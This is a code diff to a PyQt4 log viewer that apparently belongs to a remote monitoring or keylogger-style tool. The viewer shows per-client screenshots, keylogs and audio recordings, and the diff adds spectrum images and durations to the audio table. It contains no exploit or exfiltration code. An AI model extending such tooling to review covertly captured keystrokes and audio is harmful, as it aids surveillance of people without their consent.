@@ -5,6 +5,7 @@ from PyQt4.QtCore import *
 import os
 
 from libs.data_transfer import data_get, data_send, data_receive
+from libs.wav_factory import spectrum_analyzer_image, audio_duration
 from language import Translate
 
 # Multi Lang
@@ -25,11 +26,17 @@ class LogViewer(QWidget, logViewerUi):
         self.client_os = args['os']
         self.session_id = args['session_id']
 
+        self.plots = {}
+
+        # resize audio.spectrum column
+        self.audioTable.setColumnWidth(1, 570)
+
         # update gui
         self.gui = QApplication.processEvents
 
         self.screenshots_dict = {}
         self.keylogs_dict = {}
+        self.audio_dict = {}
 
         self.date = str(self.timeCalendar.selectedDate().toPyDate())
 
@@ -59,7 +66,7 @@ class LogViewer(QWidget, logViewerUi):
         # Hide Path Columns
         self.screenshotsTable.setColumnHidden(2, True)
         self.keylogsTable.setColumnHidden(2, True)
-        self.audioTable.setColumnHidden(1, True)
+        self.audioTable.setColumnHidden(3, True)
 
     def set_language(self):
         self.setWindowTitle(_('VIEWER_WINDOW_TITLE'))
@@ -112,7 +119,7 @@ class LogViewer(QWidget, logViewerUi):
         os.startfile(current_keylog_path)
 
     def open_audio(self):
-        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 1).text())
+        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 3).text())
         os.startfile(current_audio_path)
 
     def download_data(self):
@@ -320,10 +327,26 @@ class LogViewer(QWidget, logViewerUi):
             for index, key in enumerate(self.audio_dict):
                 self.gui()
 
-                # add datetime
-                item = QTableWidgetItem(self.audio_dict[key]['datetime'])
+                # add audio duration
+                item = QTableWidgetItem(audio_duration(self.audio_dict[key]['path']))
+                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+                item.setTextColor(QColor('#16a085'))
                 self.audioTable.setItem(index, 0, item)
+
+                # add screenshot preview
+                generated_spectrum = spectrum_analyzer_image(self.audio_dict[key]['path'], self.audio_dict[key]['datetime'])
+                image = QImage(generated_spectrum)
+                pixmap = QPixmap.fromImage(image)
+                spectrum_image = QLabel()
+                spectrum_image.setStyleSheet('background: none;')
+                spectrum_image.setPixmap(pixmap)
+                self.audioTable.setCellWidget(index, 1, spectrum_image)
+
+                # add date time
+                item = QTableWidgetItem(self.audio_dict[key]['datetime'])
+                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                self.audioTable.setItem(index, 2, item)
 
                 # add path
                 item = QTableWidgetItem(self.audio_dict[key]['path'])
-                self.audioTable.setItem(index, 1, item)
+                self.audioTable.setItem(index, 3, item)
